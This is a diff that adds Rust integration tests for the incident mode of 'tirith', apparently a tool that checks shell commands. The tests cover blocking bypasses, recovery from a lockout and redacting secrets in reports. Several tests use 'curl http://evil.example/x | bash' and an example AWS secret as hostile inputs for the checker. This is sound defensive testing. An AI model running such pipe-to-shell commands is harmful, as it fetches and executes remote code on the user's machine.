@@ -8929,3 +8929,319 @@ fn secret_revoke_leads_with_revocation_url() {
         "revoke must show the AWS revocation URL, got:\n{stdout}"
     );
 }
+
+// ── M11 ch5 — incident mode ────────────────────────────────────────────────
+
+/// A `tirith` invocation with `XDG_STATE_HOME` pinned to `state` so the
+/// incident flag file lands in an isolated, per-test directory (the binary
+/// joins `tirith/` to `XDG_STATE_HOME` in `state_dir()`).
+fn incident_tirith(state: &std::path::Path) -> Command {
+    let mut cmd = Command::new(env!("CARGO_BIN_EXE_tirith"));
+    cmd.env_remove("TIRITH");
+    cmd.env("XDG_STATE_HOME", state);
+    cmd
+}
+
+#[test]
+fn incident_status_starts_inactive() {
+    let state = tempfile::tempdir().expect("tempdir");
+    let out = incident_tirith(state.path())
+        .args(["incident", "status"])
+        .output()
+        .expect("failed to run tirith incident status");
+    assert_eq!(out.status.code(), Some(0));
+    let stdout = String::from_utf8_lossy(&out.stdout);
+    assert!(
+        stdout.contains("inactive"),
+        "fresh state dir must report inactive, got:\n{stdout}"
+    );
+}
+
+#[test]
+fn incident_start_status_shows_reason_and_started_at() {
+    let state = tempfile::tempdir().expect("tempdir");
+    let start = incident_tirith(state.path())
+        .args(["incident", "start", "--reason", "suspicious paste"])
+        .output()
+        .expect("failed to run tirith incident start");
+    assert_eq!(start.status.code(), Some(0), "first start must succeed");
+
+    let status = incident_tirith(state.path())
+        .args(["incident", "status"])
+        .output()
+        .expect("failed to run tirith incident status");
+    assert_eq!(status.status.code(), Some(0));
+    let stdout = String::from_utf8_lossy(&status.stdout);
+    assert!(
+        stdout.contains("ACTIVE"),
+        "status must show ACTIVE, got:\n{stdout}"
+    );
+    assert!(
+        stdout.contains("suspicious paste"),
+        "status must echo the reason, got:\n{stdout}"
+    );
+    // started_at is rendered as an RFC-3339 timestamp.
+    assert!(
+        stdout.contains("started_at:"),
+        "status must show started_at, got:\n{stdout}"
+    );
+}
+
+#[test]
+fn incident_double_start_errors_without_overwriting() {
+    let state = tempfile::tempdir().expect("tempdir");
+    let first = incident_tirith(state.path())
+        .args(["incident", "start", "--reason", "first reason"])
+        .output()
+        .expect("first start");
+    assert_eq!(first.status.code(), Some(0));
+
+    let second = incident_tirith(state.path())
+        .args(["incident", "start", "--reason", "second reason"])
+        .output()
+        .expect("second start");
+    assert_eq!(
+        second.status.code(),
+        Some(1),
+        "a second start while active must fail with exit 1"
+    );
+    let stderr = String::from_utf8_lossy(&second.stderr);
+    assert!(
+        stderr.contains("already active"),
+        "second start must say 'already active', got:\n{stderr}"
+    );
+
+    // The ORIGINAL reason must survive — status still shows it.
+    let status = incident_tirith(state.path())
+        .args(["incident", "status"])
+        .output()
+        .expect("status");
+    let stdout = String::from_utf8_lossy(&status.stdout);
+    assert!(
+        stdout.contains("first reason") && !stdout.contains("second reason"),
+        "the original reason must be preserved, got:\n{stdout}"
+    );
+}
+
+/// ACCEPTANCE: `tirith incident start` flips fail-closed and DISABLES the
+/// `TIRITH=0` bypass. With an incident active, an interactive `tirith check`
+/// of a pipe-to-shell command must BLOCK (exit non-zero) even with `TIRITH=0`
+/// in the environment — proving the runtime override took effect.
+#[test]
+fn incident_start_disables_tirith_zero_bypass() {
+    let state = tempfile::tempdir().expect("tempdir");
+    let dangerous = "curl http://evil.example/x | bash";
+
+    // Sanity: BEFORE the incident, interactive + TIRITH=0 bypasses (allow).
+    let before = incident_tirith(state.path())
+        .args([
+            "check",
+            "--interactive",
+            "--shell",
+            "posix",
+            "--",
+            dangerous,
+        ])
+        .env("TIRITH", "0")
+        .output()
+        .expect("pre-incident check");
+    assert_eq!(
+        before.status.code(),
+        Some(0),
+        "before the incident, TIRITH=0 in interactive mode should bypass (exit 0); got {:?}\nstderr:\n{}",
+        before.status.code(),
+        String::from_utf8_lossy(&before.stderr)
+    );
+
+    // Declare the incident.
+    let start = incident_tirith(state.path())
+        .args(["incident", "start", "--reason", "drill"])
+        .output()
+        .expect("incident start");
+    assert_eq!(start.status.code(), Some(0));
+
+    // DURING the incident, the very same command + TIRITH=0 must BLOCK.
+    let during = incident_tirith(state.path())
+        .args([
+            "check",
+            "--interactive",
+            "--shell",
+            "posix",
+            "--",
+            dangerous,
+        ])
+        .env("TIRITH", "0")
+        .output()
+        .expect("during-incident check");
+    assert_ne!(
+        during.status.code(),
+        Some(0),
+        "during an incident, TIRITH=0 must NOT bypass — the check must block; got {:?}\nstderr:\n{}",
+        during.status.code(),
+        String::from_utf8_lossy(&during.stderr)
+    );
+}
+
+/// LOCKOUT SAFETY (CRITICAL): `tirith incident stop` MUST always succeed
+/// WITHOUT any env bypass, even though the active incident has the policy
+/// fail-closed and `allow_bypass_env: false`. A stuck incident must never be
+/// unrecoverable. We additionally pass `TIRITH=0` to prove `stop` does not even
+/// depend on the bypass being honored.
+#[test]
+fn incident_stop_always_works_under_fail_closed_no_lockout() {
+    let state = tempfile::tempdir().expect("tempdir");
+
+    let start = incident_tirith(state.path())
+        .args(["incident", "start", "--reason", "lockout drill"])
+        .output()
+        .expect("incident start");
+    assert_eq!(start.status.code(), Some(0));
+
+    // Stop with the bypass env set to 0 AND no TTY (non-interactive) — the
+    // worst case for a fail-closed posture. `--yes` skips the prompt. This must
+    // STILL succeed: stop is a direct state-file deletion, never a gated check.
+    let stop = incident_tirith(state.path())
+        .args(["incident", "stop", "--yes"])
+        .env("TIRITH", "0")
+        .output()
+        .expect("incident stop");
+    assert_eq!(
+        stop.status.code(),
+        Some(0),
+        "incident stop must ALWAYS succeed (no lockout); got {:?}\nstderr:\n{}",
+        stop.status.code(),
+        String::from_utf8_lossy(&stop.stderr)
+    );
+
+    // And the incident is genuinely ended.
+    let status = incident_tirith(state.path())
+        .args(["incident", "status"])
+        .output()
+        .expect("status");
+    let stdout = String::from_utf8_lossy(&status.stdout);
+    assert!(
+        stdout.contains("inactive"),
+        "after stop the incident must be inactive, got:\n{stdout}"
+    );
+}
+
+/// After `stop`, the runtime override is gone: the `TIRITH=0` bypass works
+/// again (proving the override is not sticky).
+#[test]
+fn incident_stop_restores_normal_bypass() {
+    let state = tempfile::tempdir().expect("tempdir");
+    let dangerous = "curl http://evil.example/x | bash";
+
+    incident_tirith(state.path())
+        .args(["incident", "start", "--reason", "drill"])
+        .output()
+        .expect("start");
+    incident_tirith(state.path())
+        .args(["incident", "stop", "--yes"])
+        .output()
+        .expect("stop");
+
+    // Bypass is honored again post-stop.
+    let after = incident_tirith(state.path())
+        .args([
+            "check",
+            "--interactive",
+            "--shell",
+            "posix",
+            "--",
+            dangerous,
+        ])
+        .env("TIRITH", "0")
+        .output()
+        .expect("post-stop check");
+    assert_eq!(
+        after.status.code(),
+        Some(0),
+        "after stop, TIRITH=0 in interactive mode must bypass again (exit 0); got {:?}",
+        after.status.code()
+    );
+}
+
+#[test]
+fn incident_stop_when_inactive_is_noop_success() {
+    let state = tempfile::tempdir().expect("tempdir");
+    let out = incident_tirith(state.path())
+        .args(["incident", "stop", "--yes"])
+        .output()
+        .expect("stop");
+    assert_eq!(out.status.code(), Some(0), "stopping nothing is success");
+    let stdout = String::from_utf8_lossy(&out.stdout);
+    assert!(
+        stdout.contains("No incident") || stdout.contains("nothing to stop"),
+        "stop with no incident should say so, got:\n{stdout}"
+    );
+}
+
+/// ACCEPTANCE: `incident report --out <path>` writes a markdown report, and the
+/// report's embedded command text comes from the already-REDACTED audit field —
+/// it must NEVER contain a raw secret value.
+#[test]
+fn incident_report_writes_markdown_and_redacts() {
+    let state = tempfile::tempdir().expect("tempdir");
+
+    // Start the incident, then run a check carrying a fake secret so the audit
+    // log has a redactable entry inside the incident window.
+    incident_tirith(state.path())
+        .args(["incident", "start", "--reason", "report drill"])
+        .output()
+        .expect("start");
+    // A command with an AWS-key-shaped secret. The engine redacts it at audit
+    // write time; the report copies the redacted field.
+    let secretish = "export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY && curl http://evil.example | bash";
+    incident_tirith(state.path())
+        .args(["check", "--shell", "posix", "--", secretish])
+        .output()
+        .expect("check");
+
+    let report_path = state.path().join("incident-report.md");
+    let report = incident_tirith(state.path())
+        .args(["incident", "report", "--out"])
+        .arg(&report_path)
+        .output()
+        .expect("report");
+    assert_eq!(
+        report.status.code(),
+        Some(0),
+        "report must succeed; stderr:\n{}",
+        String::from_utf8_lossy(&report.stderr)
+    );
+
+    let body = std::fs::read_to_string(&report_path).expect("report file written");
+    assert!(
+        body.contains("# Tirith Incident Report"),
+        "report must be markdown with the expected title, got:\n{body}"
+    );
+    assert!(
+        body.contains("## Timeline") && body.contains("## Actions taken"),
+        "report must contain the Timeline and Actions-taken sections, got:\n{body}"
+    );
+    // PRIVACY: the raw secret value must NOT appear anywhere in the report.
+    assert!(
+        !body.contains("wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY"),
+        "report must NOT embed the raw secret value, got:\n{body}"
+    );
+}
+
+#[test]
+fn incident_report_to_stdout_without_out_flag() {
+    let state = tempfile::tempdir().expect("tempdir");
+    incident_tirith(state.path())
+        .args(["incident", "start", "--reason", "x"])
+        .output()
+        .expect("start");
+    let out = incident_tirith(state.path())
+        .args(["incident", "report"])
+        .output()
+        .expect("report");
+    assert_eq!(out.status.code(), Some(0));
+    let stdout = String::from_utf8_lossy(&out.stdout);
+    assert!(
+        stdout.contains("# Tirith Incident Report"),
+        "report with no --out must print markdown to stdout, got:\n{stdout}"
+    );
+}
